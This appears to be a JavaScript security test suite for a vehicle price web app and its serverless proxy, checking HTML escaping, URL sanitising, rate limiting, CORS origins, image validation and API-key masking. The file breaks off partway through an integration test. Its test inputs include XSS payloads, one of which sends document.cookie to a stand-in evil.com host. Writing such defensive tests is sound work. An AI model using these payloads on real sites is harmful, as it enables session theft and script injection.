// VahanaIQ Security Test Suite
// Verifies client-side sanitization, URL safety, serverless proxy rate limiting,
// origin validation, image payloads, JSON parsing resiliency, and credential masking.

import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';

// Import client-side security functions
import { esc } from '../js/calculator.js';
import { safeUrl, safeImageUrl } from '../js/safe-url.js';

// Import serverless proxy security and domain logic
import {
  DEFAULT_ORIGINS,
  DEFAULT_RATE_LIMIT,
  RATE_WINDOW_MS,
  MAX_RATE_LIMIT_ENTRIES,
  IMAGE_TYPES,
  MAX_IMAGE_BYTES,
  MAX_BODY_BYTES,
  errorCode,
  safeDetail,
  parseAllowedOrigins,
  isOriginAllowed,
  checkRateLimit,
  createRateLimiter,
  validateImage,
  validateSearchRequest,
  validatePriceRequest,
  parseJsonText,
  parseVehicleResponse
} from '../serverless/shared/proxy-logic.js';

import worker from '../serverless/cloudflare-worker.js';

console.log('=== RUNNING VAHANAIQ SECURITY TEST SUITE ===\n');

// ============================================================================
// TEST 1: esc() Function & HTML/Script Injection (XSS)
// ============================================================================
console.log('TEST 1: esc() Function & HTML/Script Injection (XSS)');

// 1.1 Fundamental character escaping
assert.equal(esc('&'), '&amp;', 'Ampersand must be escaped to &amp;');
assert.equal(esc('<'), '&lt;', 'Less-than must be escaped to &lt;');
assert.equal(esc('>'), '&gt;', 'Greater-than must be escaped to &gt;');
assert.equal(esc('"'), '&quot;', 'Double quote must be escaped to &quot;');
assert.equal(esc("'"), '&#39;', 'Single quote must be escaped to &#39;');

// 1.2 Type resilience & boundary conditions
assert.equal(esc(null), '', 'null must return empty string');
assert.equal(esc(undefined), '', 'undefined must return empty string');
assert.equal(esc(''), '', 'empty string must return empty string');
assert.equal(esc(0), '0', 'number 0 must return "0"');
assert.equal(esc(12345), '12345', 'positive number must return string representation');
assert.equal(esc(-42.5), '-42.5', 'negative float must return string representation');
assert.equal(esc(true), 'true', 'boolean true must return "true"');
assert.equal(esc(false), 'false', 'boolean false must return "false"');

// 1.3 Unicode & special characters preservation
const sinhalaTamilText = 'රථවාහන මිල ගණන් / வாகன விலை 2026';
assert.equal(esc(sinhalaTamilText), sinhalaTamilText, 'Non-HTML Unicode characters must be preserved');
const emojiText = 'Toyota Yaris 🚗 ✨';
assert.equal(esc(emojiText), emojiText, 'Emojis must be preserved');

// 1.4 Classic and advanced script tag injection attempts
assert.equal(
  esc("<script>alert('XSS')</script>"),
  '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;',
  'Standard <script> tag must be neutralized'
);
assert.equal(
  esc("<SCRIPT SRC=https://attacker.example/xss.js></SCRIPT>"),
  '&lt;SCRIPT SRC=https://attacker.example/xss.js&gt;&lt;/SCRIPT&gt;',
  'Uppercase <SCRIPT> tag with src must be neutralized'
);
assert.equal(
  esc("<script/x>alert(1)</script>"),
  '&lt;script/x&gt;alert(1)&lt;/script&gt;',
  'Script tag with slash separator must be neutralized'
);

// 1.5 Image and media onerror/onload vectors
assert.equal(
  esc('<img src=x onerror=alert(document.cookie)>'),
  '&lt;img src=x onerror=alert(document.cookie)&gt;',
  'Image tag with onerror must be neutralized'
);
assert.equal(
  esc('<img src="javascript:alert(1)">'),
  '&lt;img src=&quot;javascript:alert(1)&quot;&gt;',
  'Image tag with javascript src must be neutralized'
);
assert.equal(
  esc('<svg onload="alert(\'svg-xss\')">'),
  '&lt;svg onload=&quot;alert(&#39;svg-xss&#39;)&quot;&gt;',
  'SVG tag with onload event must be neutralized'
);
assert.equal(
  esc('<body onload="alert(1)">'),
  '&lt;body onload=&quot;alert(1)&quot;&gt;',
  'Body tag with onload handler must be neutralized'
);

// 1.6 HTML attribute breakout attempts
assert.equal(
  esc('"><script>alert(1)</script>'),
  '&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
  'Double quote closing attribute and tag must be escaped'
);
assert.equal(
  esc("'> <script>alert(1)</script>"),
  '&#39;&gt; &lt;script&gt;alert(1)&lt;/script&gt;',
  'Single quote closing attribute and tag must be escaped'
);
assert.equal(
  esc('" onmouseover="alert(\'pwned\')'),
  '&quot; onmouseover=&quot;alert(&#39;pwned&#39;)',
  'Attribute breakout with event handler must be escaped'
);
assert.equal(
  esc("' onfocus='fetch(\"http://evil.com?c=\"+document.cookie)"),
  '&#39; onfocus=&#39;fetch(&quot;http://evil.com?c=&quot;+document.cookie)',
  'Single quote attribute breakout with data exfiltration must be escaped'
);

// 1.7 Frame and object injections
assert.equal(
  esc('<iframe src="javascript:alert(1)"></iframe>'),
  '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;',
  'Iframe injection must be neutralized'
);
assert.equal(
  esc('<object data="data:text/html,<script>alert(1)</script>"></object>'),
  '&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/object&gt;',
  'Object tag injection must be neutralized'
);

// 1.8 Sequential and nested characters
assert.equal(
  esc('<<<<>>>>>&&&&""""\'\'\'\''),
  '&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&amp;&amp;&amp;&amp;&quot;&quot;&quot;&quot;&#39;&#39;&#39;&#39;',
  'Repetitive control characters must all be strictly escaped'
);
assert.equal(
  esc('&amp; &lt; &gt; &quot; &#39;'),
  '&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;',
  'Existing entities must be safely re-encoded to prevent double-interpretation'
);

console.log('✓ esc() Function & HTML/Script Injection (XSS) PASSED\n');

// ============================================================================
// TEST 2: URL Validation & Scheme Hardening (safeUrl, safeImageUrl)
// ============================================================================
console.log('TEST 2: URL Validation & Scheme Hardening (safeUrl, safeImageUrl)');

// 2.1 Rejection of dangerous javascript: schemes
const dangerousJsUrls = [
  'javascript:alert(1)',
  'javascript:void(0)',
  'javascript:alert(document.domain)',
  'JAVASCRIPT:alert("xss")',
  'JavaScript:window.location="http://evil.com"',
  ' javascript:alert(1)',
  'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
];
for (const u of dangerousJsUrls) {
  assert.equal(safeUrl(u), '#', `safeUrl must reject javascript URI: ${u}`);
}

// 2.2 Rejection of dangerous data: schemes
const dangerousDataUrls = [
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'data:text/html;charset=utf-8,%3Cscript%3Ealert(1)%3C/script%3E',
  'data:image/svg+xml,<svg onload=alert(1)>',
  'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+',
  'DATA:text/html,<script>alert(1)</script>'
];
for (const u of dangerousDataUrls) {
  assert.equal(safeUrl(u), '#', `safeUrl must reject data: scheme: ${u}`);
}

// 2.3 Rejection of other unauthorized schemes
const unauthorizedSchemes = [
  'vbscript:msgbox(1)',
  'VBSCRIPT:alert(1)',
  'file:///etc/passwd',
  'file:///C:/Windows/win.ini',
  'ftp://ftp.example.com/malware.exe',
  'tel:+94112345678',
  'mailto:victim@example.com',
  'blob:https://example.com/d5a86a34-2e98-4444-a021-3e4b788647a2'
];
for (const u of unauthorizedSchemes) {
  assert.equal(safeUrl(u), '#', `safeUrl must reject non-http(s) scheme: ${u}`);
}

// 2.4 Invalid / malformed inputs to safeUrl
assert.equal(safeUrl(null), '#', 'safeUrl(null) must return #');
assert.equal(safeUrl(undefined), '#', 'safeUrl(undefined) must return #');
assert.equal(safeUrl(''), '#', 'safeUrl("") must return #');
assert.equal(safeUrl('   '), '#', 'safeUrl whitespace must return #');
assert.equal(safeUrl('/relative/path/car.webp'), '#', 'Relative path must return # (only absolute HTTP/HTTPS allowed)');
assert.equal(safeUrl('images/car.jpg'), '#', 'Relative file path must return #');
assert.equal(safeUrl('://missing-scheme'), '#', 'Malformed URI without scheme must return #');
assert.equal(safeUrl('http//missing-colon.example.com'), '#', 'Malformed URL must return #');

// 2.5 Legitimate HTTP and HTTPS URLs allowed and escaped
assert.equal(
  safeUrl('https://akila-w.github.io/vahanaiq/'),
  'https://akila-w.github.io/vahanaiq/',
  'Valid HTTPS URL must be permitted'
);
assert.equal(
  safeUrl('http://toyota.lk/models/yaris-cross'),
  'http://toyota.lk/models/yaris-cross',
  'Valid HTTP URL must be permitted'
);
assert.equal(
  safeUrl('https://example.com/search?make=Toyota&model=Yaris&year=2026'),
  'https://example.com/search?make=Toyota&amp;model=Yaris&amp;year=2026',
  'Query string ampersands must be HTML-escaped for safe injection into href attributes'
);
assert.equal(
  safeUrl('https://example.com:8443/spec#dimensions'),
  'https://example.com:8443/spec#dimensions',
  'Port numbers and fragments must be preserved'
);

// 2.6 safeImageUrl() tests
assert.equal(safeImageUrl('javascript:alert(1)'), '', 'safeImageUrl must reject javascript: URI');
assert.equal(safeImageUrl('vbscript:msgbox(1)'), '', 'safeImageUrl must reject vbscript: URI');
assert.equal(safeImageUrl('data:text/html,<script>alert(1)</script>'), '', 'safeImageUrl must reject data:text/html URI');
assert.equal(safeImageUrl('data:image/svg+xml,<svg onload=alert(1)>'), '', 'safeImageUrl must reject SVG data URIs');
assert.equal(safeImageUrl('DATA:IMAGE/SVG+XML;base64,PHN2Zz4='), '', 'safeImageUrl must reject uppercase SVG data URIs');
assert.equal(safeImageUrl(null), '', 'safeImageUrl(null) must return empty string');
assert.equal(safeImageUrl(undefined), '', 'safeImageUrl(undefined) must return empty string');
assert.equal(safeImageUrl(''), '', 'safeImageUrl("") must return empty string');
assert.equal(safeImageUrl('   '), '', 'safeImageUrl whitespace must return empty string');
assert.equal(
  safeImageUrl('assets/cars/toyota-yaris.webp'),
  'assets/cars/toyota-yaris.webp',
  'safeImageUrl allows local relative asset path'
);
assert.equal(
  safeImageUrl('https://cdn.example.com/images/car.png?v=1&w=640'),
  'https://cdn.example.com/images/car.png?v=1&amp;w=640',
  'safeImageUrl escapes query parameter ampersands'
);
assert.equal(
  safeImageUrl('data:image/jpeg;base64,/9j/4AAQSkZJRg=='),
  'data:image/jpeg;base64,/9j/4AAQSkZJRg==',
  'safeImageUrl allows safe base64 JPEG data URI'
);

console.log('✓ URL Validation & Scheme Hardening (safeUrl, safeImageUrl) PASSED\n');

// ============================================================================
// TEST 3: Rate Limiting Logic (createRateLimiter, checkRateLimit)
// ============================================================================
console.log('TEST 3: Rate Limiting Logic (createRateLimiter, checkRateLimit)');

// 3.1 Rate limiter instance creates and enforces threshold
const limiter = createRateLimiter({ windowMs: 1000, defaultLimit: 5, maxEntries: 10 });
const testIp1 = '203.0.113.1';

// Requests 1 through 5 must pass (not rate limited, returns false)
for (let i = 1; i <= 5; i++) {
  const isLimited = limiter(testIp1);
  assert.equal(isLimited, false, `Request ${i} of 5 must not be rate limited`);
}

// Request 6 must exceed quota (returns true)
assert.equal(limiter(testIp1), true, 'Request 6 must be rate limited');
assert.equal(limiter(testIp1), true, 'Request 7 must remain rate limited');

// 3.2 IP isolation: Rate limiting on testIp1 must not affect testIp2
const testIp2 = '203.0.113.2';
assert.equal(limiter(testIp2), false, 'Distinct IP must have independent quota');

// 3.3 Direct checkRateLimit with custom Map and limits
const customHits = new Map();
assert.equal(checkRateLimit(customHits, '198.51.100.10', 2, 60000), false, '1st hit allowed');
assert.equal(checkRateLimit(customHits, '198.51.100.10', 2, 60000), false, '2nd hit allowed');
assert.equal(checkRateLimit(customHits, '198.51.100.10', 2, 60000), true, '3rd hit blocked (> 2)');

// 3.4 Sliding window expiration: old hits prune when time advances
const expiredHits = new Map();
const oldTimestamp = Date.now() - 70000; // 70 seconds ago
expiredHits.set('198.51.100.20', [oldTimestamp, oldTimestamp + 1000]);
// Window of 60 seconds should expire the old hits, meaning current request is count = 1 <= limit 2
assert.equal(
  checkRateLimit(expiredHits, '198.51.100.20', 2, 60000),
  false,
  'Expired timestamps must be excluded from recent window count'
);
assert.equal(expiredHits.get('198.51.100.20').length, 1, 'Only current hit remains after window pruning');

// 3.5 Memory bounding: Cache eviction when entries exceed maxEntries
const boundedHits = new Map();
const maxEntries = 5;
for (let i = 1; i <= maxEntries; i++) {
  checkRateLimit(boundedHits, `10.0.0.${i}`, 10, 60000, maxEntries);
}
assert.equal(boundedHits.size, maxEntries, `Map holds exactly ${maxEntries} IPs`);
assert.ok(boundedHits.has('10.0.0.1'), 'First IP is present');

// Adding 6th entry should evict the oldest key ('10.0.0.1')
checkRateLimit(boundedHits, '10.0.0.6', 10, 60000, maxEntries);
assert.equal(boundedHits.size, maxEntries, `Map size bounded at maxEntries (${maxEntries})`);
assert.equal(boundedHits.has('10.0.0.1'), false, 'Oldest IP evicted to prevent unbounded memory growth');
assert.ok(boundedHits.has('10.0.0.6'), 'Newest IP is retained in map');

// 3.6 Default configuration constants
assert.equal(DEFAULT_RATE_LIMIT, 30, 'Default rate limit must be 30 requests');
assert.equal(RATE_WINDOW_MS, 600000, 'Default rate window must be 10 minutes (600,000 ms)');
assert.equal(MAX_RATE_LIMIT_ENTRIES, 5000, 'Default maximum tracked IPs must be 5000');

console.log('✓ Rate Limiting Logic (createRateLimiter, checkRateLimit) PASSED\n');

// ============================================================================
// TEST 4: Origin Validation & CORS Allowlist
// ============================================================================
console.log('TEST 4: Origin Validation & CORS Allowlist');

// 4.1 parseAllowedOrigins handling
assert.deepEqual(
  parseAllowedOrigins(''),
  ['https://akila-w.github.io'],
  'Empty origin string must fall back to DEFAULT_ORIGINS'
);
assert.deepEqual(
  parseAllowedOrigins(null),
  ['https://akila-w.github.io'],
  'null origin must fall back to DEFAULT_ORIGINS'
);
assert.deepEqual(
  parseAllowedOrigins('https://akila-w.github.io, http://localhost:8080, https://dev.vahanaiq.lk'),
  ['https://akila-w.github.io', 'http://localhost:8080', 'https://dev.vahanaiq.lk'],
  'Comma-separated origins parsed and trimmed'
);
assert.deepEqual(
  parseAllowedOrigins('  https://a.example.com  , ,  https://b.example.com  '),
  ['https://a.example.com', 'https://b.example.com'],
  'Extra whitespace and empty segments must be filtered'
);

// 4.2 isOriginAllowed with missing/non-browser origins
assert.equal(isOriginAllowed('', 'https://akila-w.github.io'), true, 'Missing origin header allowed (server/CLI)');
assert.equal(isOriginAllowed(null, 'https://akila-w.github.io'), true, 'null origin header allowed');
assert.equal(isOriginAllowed(undefined, 'https://akila-w.github.io'), true, 'undefined origin header allowed');

// 4.3 Allowed origins exact match
const allowed = ['https://akila-w.github.io', 'http://localhost:8080'];
assert.equal(isOriginAllowed('https://akila-w.github.io', allowed), true, 'Official origin must be allowed');
assert.equal(isOriginAllowed('http://localhost:8080', allowed), true, 'Configured localhost origin must be allowed');

// 4.4 Disallowed and spoofed origins strictly rejected
const hostileOrigins = [
  'https://evil-attacker.example',
  'https://akila-w.github.io.evil.example',          // Subdomain suffix attack
  'https://fake-akila-w.github.io',                  // Prefix spoof
  'https://sub.akila-w.github.io',                   // Unauthorized subdomain
  'http://akila-w.github.io',                        // Protocol downgrade (HTTP instead of HTTPS)
  'https://akila-w.github.io:8443',                  // Port manipulation
  'null',                                            // Sandboxed iframe 'null' string
  'file://',                                         // Local file origin
  '*'                                                // Literal asterisk wildcard
];
for (const badOrigin of hostileOrigins) {
  assert.equal(isOriginAllowed(badOrigin, allowed), false, `Origin must be rejected: ${badOrigin}`);
}

console.log('✓ Origin Validation & CORS Allowlist PASSED\n');

// ============================================================================
// TEST 5: Image Type and Size Validation
// ============================================================================
console.log('TEST 5: Image Type and Size Validation');

// 5.1 validateImage with null / omitted image
assert.deepEqual(validateImage(null), { valid: true }, 'Null image is valid (optional parameter)');
assert.deepEqual(validateImage(undefined), { valid: true }, 'Undefined image is valid');

// 5.2 Allowed MIME types with matching magic bytes
const validImageSamples = {
  'image/jpeg': '/9j/4AAQSkZJRg==', // FF D8 FF
  'image/png': 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', // 89 50 4E 47
  'image/gif': 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', // 47 49 46 38
  'image/webp': Buffer.from([0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]).toString('base64') // 52 49 46 46 ... 57 45 42 50
};

for (const [mime, b64Data] of Object.entries(validImageSamples)) {
  const res = validateImage({ mimeType: mime, data: b64Data });
  assert.equal(res.valid, true, `MIME type ${mime} with matching magic bytes must be accepted`);
}
// Default MIME fallback to image/jpeg if mimeType is omitted
assert.equal(validateImage({ data: validImageSamples['image/jpeg'] }).valid, true, 'Default MIME type defaults to image/jpeg');

// Mismatched MIME type vs real magic bytes (e.g. PNG labelled as image/jpeg)
const pngAsJpeg = validateImage({ mimeType: 'image/jpeg', data: validImageSamples['image/png'] });
assert.equal(pngAsJpeg.valid, false, 'PNG labelled as image/jpeg must be rejected with 400');
assert.equal(pngAsJpeg.error, 'bad_request');
assert.equal(pngAsJpeg.status, 400);

const jpegAsPng = validateImage({ mimeType: 'image/png', data: validImageSamples['image/jpeg'] });
assert.equal(jpegAsPng.valid, false, 'JPEG labelled as image/png must be rejected with 400');
assert.equal(jpegAsPng.error, 'bad_request');
assert.equal(jpegAsPng.status, 400);

// Base64 charset check: invalid characters rejected
for (const badCharset of ['not-valid-base64!', '<svg>bad</svg>', 'valid base64 with spaces', '==AA']) {
  const res = validateImage({ mimeType: 'image/jpeg', data: badCharset });
  assert.equal(res.valid, false, `Non-base64 charset must be rejected`);
  assert.equal(res.error, 'bad_request');
  assert.equal(res.status, 400);
}

// 5.3 Dangerous and unsupported MIME types rejected
const rejectedMimes = [
  'application/pdf',
  'image/svg+xml',             // SVG could contain embedded JavaScript
  'text/html',
  'application/javascript',
  'text/plain',
  'image/x-icon',
  'image/bmp',
  'image/tiff'
];
for (const mime of rejectedMimes) {
  const res = validateImage({ mimeType: mime, data: 'SGVsbG8gV29ybGQ=' });
  assert.equal(res.valid, false, `MIME ${mime} must be rejected`);
  assert.equal(res.error, 'bad_request');
  assert.equal(res.status, 400);
}

// 5.4 Non-string data payload rejected
for (const badData of [12345, true, null, {}, [], undefined]) {
  const res = validateImage({ mimeType: 'image/png', data: badData });
  assert.equal(res.valid, false, `Non-string data (${typeof badData}) must be rejected`);
  assert.equal(res.error, 'bad_request');
  assert.equal(res.status, 400);
}

// 5.5 Size limits: MAX_IMAGE_BYTES (4 MB decoded bytes) boundary testing
assert.equal(MAX_IMAGE_BYTES, 4 * 1024 * 1024, 'MAX_IMAGE_BYTES must equal 4,194,304 bytes');

// The request-body ceiling must be larger than the base64 form of a full-size image,
// otherwise the body gate refuses a screenshot that validateImage would accept.
assert.equal(MAX_BODY_BYTES, 6000000, 'MAX_BODY_BYTES must equal 6,000,000 bytes');
assert.ok(MAX_BODY_BYTES > Math.ceil(MAX_IMAGE_BYTES * 4 / 3), 'MAX_BODY_BYTES must exceed the base64 inflation of MAX_IMAGE_BYTES');

// Exact maximum size: 4 * 1024 * 1024 decoded bytes (JPEG with FF D8 FF header)
const headerBuf = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
const exactRaw = Buffer.concat([headerBuf, Buffer.alloc(MAX_IMAGE_BYTES - 4, 0x41)]);
const exactMaxSizeData = exactRaw.toString('base64');
assert.equal(
  validateImage({ mimeType: 'image/jpeg', data: exactMaxSizeData }).valid,
  true,
  'Image exactly at MAX_IMAGE_BYTES must be accepted'
);

// Exceeding maximum size by 1 byte: 4,194,305 decoded bytes rejected with 413
const overRaw = Buffer.concat([headerBuf, Buffer.alloc(MAX_IMAGE_BYTES - 4 + 1, 0x41)]);
const overMaxSizeData = overRaw.toString('base64');
const overRes = validateImage({ mimeType: 'image/jpeg', data: overMaxSizeData });
assert.equal(overRes.valid, false, 'Image exceeding MAX_IMAGE_BYTES must be rejected');
assert.equal(overRes.error, 'image_too_large');
assert.equal(overRes.status, 413);

// 5.6 validateSearchRequest scenarios
assert.equal(validateSearchRequest({ query: 'Toyota Yaris' }).valid, true, 'Search with query only is valid');
assert.equal(
  validateSearchRequest({ image: { mimeType: 'image/jpeg', data: validImageSamples['image/jpeg'] } }).valid,
  true,
  'Search with image only is valid'
);
assert.equal(
  validateSearchRequest({ query: 'Toyota Yaris', image: { mimeType: 'image/jpeg', data: validImageSamples['image/jpeg'] } }).valid,
  true,
  'Search with both query and image is valid'
);
// Missing both query and image
assert.deepEqual(
  validateSearchRequest({}),
  { valid: false, error: 'bad_request', detail: 'Missing query or image parameter', status: 400 },
  'Empty body missing query and image must be rejected'
);
assert.deepEqual(
  validateSearchRequest(null),
  { valid: false, error: 'bad_request', detail: 'Missing query or image parameter', status: 400 },
  'null body must be rejected'
);
// Query with invalid image
const invalidImgSearch = validateSearchRequest({ query: 'Toyota', image: { mimeType: 'application/pdf', data: 'abc' } });
assert.equal(invalidImgSearch.valid, false, 'Search with invalid image must be rejected');
assert.equal(invalidImgSearch.status, 400);

console.log('✓ Image Type and Size Validation PASSED\n');

// ============================================================================
// TEST 6: Malformed JSON Handling & Resilient Parsing
// ============================================================================
console.log('TEST 6: Malformed JSON Handling & Resilient Parsing');

// 6.1 parseJsonText on clean JSON
const cleanObj = { make: 'Toyota', model: 'Corolla Cross', year: 2026 };
assert.deepEqual(
  parseJsonText(JSON.stringify(cleanObj)),
  cleanObj,
  'Clean JSON object must parse correctly'
);

// 6.2 Markdown code fences
const fencedJson = '```json\n{\n  "status": "success",\n  "vehicles": []\n}\n```';
assert.deepEqual(
  parseJsonText(fencedJson),
  { status: 'success', vehicles: [] },
  'JSON enclosed in ```json fences must parse correctly'
);

const genericFencedJson = '```\n{"model": "Yaris Cross"}\n```';
assert.deepEqual(
  parseJsonText(genericFencedJson),
  { model: 'Yaris Cross' },
  'JSON enclosed in generic ``` fences must parse correctly'
);

// 6.3 Conversational commentary wrapping JSON
const proseJson = `
Based on my market research of Sri Lankan authorised dealers:
{
  "vehicles": [
    { "model_name": "Honda Vezel e:HEV Z", "price_lkr": 21500000 }
  ]
}
Please verify current excise duties with Sri Lanka Customs.
`;
assert.deepEqual(
  parseJsonText(proseJson),
  { vehicles: [{ model_name: 'Honda Vezel e:HEV Z', price_lkr: 21500000 }] },
  'JSON surrounded by introductory and concluding prose must parse cleanly'
);

// 6.4 Nested curly braces inside string values
const nestedBracesJson = '{"notes": "Includes {Special Features} and option {A}", "id": 101}';
assert.deepEqual(
  parseJsonText(nestedBracesJson),
  { notes: 'Includes {Special Features} and option {A}', id: 101 },
  'JSON containing curly braces within string values must parse without truncation'
);

// 6.5 Malformed JSON syntax inside braces
assert.throws(
  () => parseJsonText('{"model": Toyota}'),
  SyntaxError,
  'Unquoted string identifier inside JSON must throw SyntaxError'
);
assert.throws(
  () => parseJsonText('{"model": "Toyota", "price": }'),
  SyntaxError,
  'Truncated value inside JSON must throw SyntaxError'
);
assert.throws(
  () => parseJsonText('{"items": [1, 2, ]}'),
  SyntaxError,
  'Trailing comma in array without closing must throw SyntaxError'
);

// 6.6 Non-JSON strings or missing braces
assert.throws(
  () => parseJsonText('No vehicles could be identified in Sri Lanka.'),
  /No JSON object in the model reply/,
  'Prose without JSON braces must throw explicit error'
);
assert.throws(
  () => parseJsonText(''),
  /No JSON object in the model reply/,
  'Empty string must throw explicit error'
);
assert.throws(
  () => parseJsonText(null),
  /No JSON object in the model reply/,
  'null text must throw explicit error'
);
assert.throws(
  () => parseJsonText('} inverted braces {'),
  /No JSON object in the model reply/,
  'Inverted braces must throw explicit error'
);

// 6.7 parseVehicleResponse validation
assert.deepEqual(
  parseVehicleResponse({
    candidates: [{ content: { parts: [{ text: '{"is_available_in_sri_lanka": true}' }] } }]
  }),
  { is_available_in_sri_lanka: true },
  'Valid Gemini candidate JSON parts parse correctly'
);
assert.throws(
  () => parseVehicleResponse({}),
  /Missing content parts in Gemini response/,
  'Empty Gemini response structure must throw descriptive error'
);
assert.throws(
  () => parseVehicleResponse({ candidates: [] }),
  /Missing content parts in Gemini response/,
  'Missing candidates array must throw descriptive error'
);
assert.throws(
  () => parseVehicleResponse({ candidates: [{ content: { parts: [] } }] }),
  /Missing content parts in Gemini response/,
  'Missing parts in candidate content must throw descriptive error'
);

console.log('✓ Malformed JSON Handling & Resilient Parsing PASSED\n');

// ============================================================================
// TEST 7: safeDetail Stripping Keys & Credential Sanitization
// ============================================================================
console.log('TEST 7: safeDetail Stripping Keys & Credential Sanitization');

// 7.1 Strips Google API key in error detail
assert.equal(
  safeDetail('API error at https://generativelanguage.googleapis.com/v1beta/models key=AIzaSyD_TEST_SECRET_KEY_12345'),
  'API error at https://generativelanguage.googleapis.com/v1beta/models key=[removed]',
  'Google API key must be replaced with key=[removed]'
);

// 7.2 Strips key parameter surrounded by other query parameters
assert.equal(
  safeDetail('https://api.example.com/endpoint?foo=1&key=AIzaSecretToken999&bar=2'),
  'https://api.example.com/endpoint?foo=1&key=[removed]&bar=2',
  'API key surrounded by sibling query parameters must be cleanly replaced'
);

// 7.3 Case-insensitivity (key=, Key=, KEY=)
assert.equal(
  safeDetail('Upstream error: KEY=SECRET_UPPER_CASE_KEY'),
  'Upstream error: key=[removed]',
  'Uppercase KEY= must be sanitized'
);
assert.equal(
  safeDetail('Upstream error: Key=Secret_Mixed_Case_Key'),
  'Upstream error: key=[removed]',
  'Mixed case Key= must be sanitized'
);

// 7.4 Multiple keys in single error string
assert.equal(
  safeDetail('Failed key=FIRST_KEY_TOKEN and retry with key=SECOND_KEY_TOKEN failed'),
  'Failed key=[removed] and retry with key=[removed] failed',
  'All key occurrences in string must be sanitized'
);

// 7.5 Bearer tokens and GCP project IDs
assert.equal(
  safeDetail('Unauthorized: Bearer ya29.a0AfH6SMA... secret token for projects/my-secret-gcp-project-12345'),
  'Unauthorized: Bearer [removed] secret token for projects/[removed]',
  'Bearer authorization tokens and GCP project identifiers must be stripped'
);

// 7.6 Length truncation to 200 characters max
const longMessage = 'Error detail: ' + 'x'.repeat(250);
const sanitizedLong = safeDetail(longMessage);
assert.ok(sanitizedLong.length <= 200, `Sanitized string length (${sanitizedLong.length}) must not exceed 200 characters`);
assert.equal(sanitizedLong.length, 200, 'Sanitized string truncated at exactly 200 characters');

// 7.7 Boundary and nullish values
assert.equal(safeDetail(null), '', 'safeDetail(null) must return empty string');
assert.equal(safeDetail(undefined), '', 'safeDetail(undefined) must return empty string');
assert.equal(safeDetail(''), '', 'safeDetail("") must return empty string');
assert.equal(safeDetail('Standard error with no secret'), 'Standard error with no secret', 'String without keys remains intact');

console.log('✓ safeDetail Stripping Keys & Credential Sanitization PASSED\n');

// ============================================================================
// TEST 8: Price Mode Request Validation (validatePriceRequest)
// ============================================================================
console.log('TEST 8: Price Mode Request Validation (validatePriceRequest)');

// 8.1 Valid price request queries
assert.equal(
  validatePriceRequest({ queries: ['Toyota Yaris Cross', 'Honda Vezel'] }).valid,
  true,
  'Array of valid vehicle names must pass'
);
assert.equal(
  validatePriceRequest({ queries: ['BYD Atto 3'] }).valid,
  true,
  'Single query must pass'
);
// Exactly 12 queries (MAX_PRICE_QUERIES)
const maxQueries = Array.from({ length: 12 }, (_, i) => `Vehicle Model ${i + 1}`);
assert.equal(
  validatePriceRequest({ queries: maxQueries }).valid,
  true,
  'Exactly 12 queries must pass'
);

// 8.2 Invalid price requests
assert.equal(
  validatePriceRequest({ queries: [] }).valid,
  false,
  'Empty queries array must be rejected'
);
assert.equal(
  validatePriceRequest({ queries: 'Toyota Yaris' }).valid,
  false,
  'Non-array queries must be rejected'
);
assert.equal(
  validatePriceRequest({}).valid,
  false,
  'Missing queries property must be rejected'
);
assert.equal(
  validatePriceRequest(null).valid,
  false,
  'null body must be rejected'
);
// Exceeding 12 queries
const tooManyQueries = Array.from({ length: 13 }, (_, i) => `Vehicle Model ${i + 1}`);
const tooManyRes = validatePriceRequest({ queries: tooManyQueries });
assert.equal(tooManyRes.valid, false, '13 queries must exceed limit and be rejected');
assert.equal(tooManyRes.status, 400);

// Array containing empty strings or whitespace
assert.equal(
  validatePriceRequest({ queries: ['Toyota Yaris', ''] }).valid,
  false,
  'Array containing empty string query must be rejected'
);
assert.equal(
  validatePriceRequest({ queries: ['Toyota Yaris', '   '] }).valid,
  false,
  'Array containing whitespace-only query must be rejected'
);
assert.equal(
  validatePriceRequest({ queries: ['Toyota Yaris', 12345] }).valid,
  false,
  'Array containing non-string query must be rejected'
);

console.log('✓ Price Mode Request Validation (validatePriceRequest) PASSED\n');

// ============================================================================
// TEST 9: Serverless Proxy Security Integration (Cloudflare Worker & Cloud Run)
// ============================================================================
console.log('TEST 9: Serverless Proxy Security Integration (Cloudflare Worker & Cloud Run)');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vahanaiq-security-integration-'));
const framework = path.join(tmp, 'node_modules/@google-cloud/functions-framework');
fs.mkdirSync(framework, { recursive: true });
fs.writeFileSync(path.join(framework, 'index.js'), 'exports.http = (_, fn) => { globalThis.__securitySearchHandler = fn; };');
fs.mkdirSync(path.join(tmp, 'shared'), { recursive: true });
fs.copyFileSync(new URL('../serverless/shared/proxy-logic.js', import.meta.url), path.join(tmp, 'shared', 'proxy-logic.js'));
fs.copyFileSync(new URL('../serverless/gcp-cloud-function/index.js', import.meta.url), path.join(tmp, 'index.js'));

const previousKey = process.env.GEMINI_API_KEY;
process.env.GEMINI_API_KEY = 'test-placeholder-key';
const realFetch = globalThis.fetch;
const realError = console.error;
let upstreamStatus = 200;
let upstreamBody = { candidates: [{ content: { parts: [{ text: '{"is_available_in_sri_lanka": true}' }] } }] };
let lastUpstreamUrl = '', lastUpstreamHeaders = {};

globalThis.fetch = async (url, init) => {
  lastUpstreamUrl = url;
